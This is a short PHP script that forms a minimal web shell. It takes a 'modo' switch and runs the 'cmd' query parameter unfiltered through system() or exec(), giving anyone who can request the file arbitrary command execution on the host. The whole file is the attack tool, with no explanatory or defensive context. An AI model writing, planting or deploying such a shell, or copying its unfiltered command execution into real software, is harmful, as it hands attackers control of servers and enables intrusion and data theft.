<?php
$modo = $_GET['modo'];
if ($modo=='System') {
  system($_GET['cmd']);
}elseif ($modo=='Exec') {
  echo exec($_GET['cmd']);
}